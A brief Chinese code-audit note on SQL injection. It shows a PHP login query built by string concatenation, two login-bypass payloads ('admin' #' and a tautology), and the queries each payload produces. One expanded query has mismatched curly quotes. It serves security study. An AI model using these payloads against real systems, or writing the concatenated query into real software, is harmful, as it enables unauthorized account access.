# 代码审计笔记
## sql注入：
###原始代码
``` php
	$query  = "SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';";
```
###注入代码
```sql
admin' #
SELECT * FROM `users` WHERE user = 'admin' #' AND password = 'd41d8cd98f00b204e9800998ecf8427e';
admin' or '1' ='1
SELECT * FROM `users` WHERE user = 'admin’ or ’1=’1' AND password = 'd41d8cd98f00b204e9800998ecf8427e';
```
